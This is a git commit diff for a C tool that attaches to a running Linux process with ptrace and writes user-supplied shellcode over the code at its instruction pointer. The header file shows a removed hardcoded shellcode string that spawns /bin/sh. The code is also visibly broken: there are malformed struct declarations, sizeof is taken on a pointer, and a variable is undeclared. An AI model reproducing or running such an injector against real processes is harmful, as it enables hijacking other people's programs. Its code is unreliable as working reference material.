995beba6bd7d98bd1ea5e65cc39ccf75403642c7
Ofek <ofekerez@gmail.com>
2024-07-27 18:01:44 +0300

    Finished writing.

--- so_injector.c
+++ so_injector.c
@@ -1,24 +1,36 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+#include <sys/ptrace.h>
 #include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#include <sys/user.h>
+#include <sys/reg.h>
 #include "so_injector.h"
+
+
+void log_syscall_failure(int syscallReturnCode, char* error_message){
+    perror(error_message);
+    exit(syscallReturnCode);
+}
 
 int attach_target_process(pid_t processId){
     printf("[+] Tracing process without sending SIGSTOP %d\n", processId);
     int syscallReturnCode = ptrace(PTRACE_SEIZE, processId, NULL, NULL); 
     if (syscallReturnCode < 0){
-        perror("[-] Ptrace Seize syscall has failed\n");
-        exit(syscallReturnCode);
+        log_syscall_failure(syscallReturnCode, "[-] Ptrace Seize syscall has failed\n");
     }
     return 0;
 }
 
 int detach_target_process(pid_t processId){
     int syscallReturnCode = ptrace(PTRACE_DETACH, processId, NULL, NULL);
-    if (syscallReturnCode < 0)
-	{
-	  perror("[-] Ptrace detach syscall has failed\n");
-	  exit(syscallReturnCode);
+    if (syscallReturnCode < 0){
+         log_syscall_failure(syscallReturnCode, "[-] Ptrace detach syscall has failed\n");
 	}
     return 0;
 }
@@ -28,49 +40,50 @@ struct get_target_process_registers(pid_t processId){
     printf("[+] Getting target process registers\n");
     int syscallReturnCode = ptrace(PTRACE_GETREGS, processId, &targetProcessRegisters); 
     if (syscallReturnCode < 0){
-        perror("[-] Ptrace Get regs syscall has failed\n");
-        exit(syscallReturnCode);
+         log_syscall_failure(syscallReturnCode, "[-] Ptrace Get regs syscall has failed\n");
     }
     return targetProcessRegisters;
 }
 
-int inject_shellcode(pid_t targetProcess, struct targetProcessRegisters){
-    printf("[+] Injecting shellcode to the target process RIP register: %p\n", (void*) targetProcessRegisters.rip);
-    int i;
-    uint32_t *sourceAddress;
-    uint32_t *destinationAddress;
-    for (i = 0; i < SHELL_CODE_SIZE; i+=4, *sourceAddress++, *destinationAddress++)
+int inject_shellcode(pid_t targetProcessId, struct targetProcessRegisters, char* shellCode){
+    void* targetProcessInstructionPointer = (void*) targetProcessRegisters.rip;
+    printf("[+] Injecting shellcode to the target process RIP register: %p\n", targetProcessRegisters.rip);
+    uint32_t *shellCodeStartAddress = (uint32_t *) shellCode;
+    uint32_t *memoryAddressToChange = (uint32_t *) targetProcessInstructionPointer;
+    printf("[+] shell code payload starting address %p\n", shellCode);
+    printf("[+] target Process Insturction pointer %p\n", targetProcessInstructionPointer);
+    printf("Shell code's size: %d\n", sizeof(shellCode));
+    for (int i = 0; i < sizeof(shellCode); i+=4, *shellCodeStartAddress++, *memoryAddressToChange++)
         {
-            int syscallReturnCode = ptrace(PTRACE_POKETEXT, targetProcessId, destinationAddress, *sourceAddress);
+            printf("[+] Running the ptrace syscall with the parameters: %d,\n %p,\n %s\n", targetProcessId, memoryAddressToChange, *shellCodeStartAddress);
+            int syscallReturnCode = ptrace(PTRACE_POKETEXT, targetProcessId, memoryAddressToChange, *shellCodeStartAddress);
             if (syscallReturnCode < 0){
-                perror ("[-] PTRACE POKETEXT syscall failed\n");
-                exit (syscallReturnCode);
+                 log_syscall_failure(syscallReturnCode, "[-] PTRACE POKETEXT syscall failed\n");
             }
         }
-    printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
-    int syscallReturnCode = ptrace(PTRACE_SETREGS, targetProcess, NULL, &regs);
-    if(syscallReturnCode < 0)
-        {
-        perror ("[-] Ptrace Set Registers syscall failed\n");
-        exit (syscallReturnCode);
+    printf ("[+] Setting instruction pointer to %p\n", (void*)targetProcessRegisters.rip);
+    int syscallReturnCode = ptrace(PTRACE_SETREGS, targetProcess, NULL, &targetProcessRegisters);
+    if(syscallReturnCode < 0){
+         log_syscall_failure(syscallReturnCode, "[-] Ptrace Set Registers syscall failed\n");
         }
      return 0;
 }
 
-int inject_so(pid_t processId){
+int inject_code(pid_t processId, char* shellCode){
     attach_target_process(processId);
-    inject_shellcode(processId, get_target_process_registers(processId));
+    inject_shellcode(processId, get_target_process_registers(processId), shellCode);
     detach_target_process(processId);
     return 0;
 }
 
 
 int main(int argc, char* argv[], char *envp[]){
-    if (argc != 2){
-        fprintf(stderr, "Usage: ./so_injector --target-process <pid>\n ", argv[0]);
+    if (argc != 3){
+        fprintf(stderr, "Usage: ./linux_code_injector --target-process <pid> --shell-code <string>\n", argv[0]);
         exit(-1);
     }
     pid_t targetProcess = atoi(argv[1]);
-    inject_so(targetProcess);
+    shellCode = (char* )argv[2];
+    inject_code(targetProcess, shellCode);
     return 1;
 }
--- so_injector.h
+++ so_injector.h
@@ -1,11 +1,9 @@
 #include <stdlib.h>
-
-
-#define SHELL_CODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
-#define SHELL_CODE_SIZE 55
-int inject_so(pid_t processId);
+#include <sys/types.h>
+int inject_code(pid_t processId);
 int attach_target_process(pid_t processId);
 int inject_shellcode(pid_t targetProcess, struct targetProcessRegisters);
 int deatch_target_process(pid_t processId);
+void log_syscall_failure(int syscallReturnCode, char* error_message);
 struct get_target_process_registers(pid_t processId); 
 
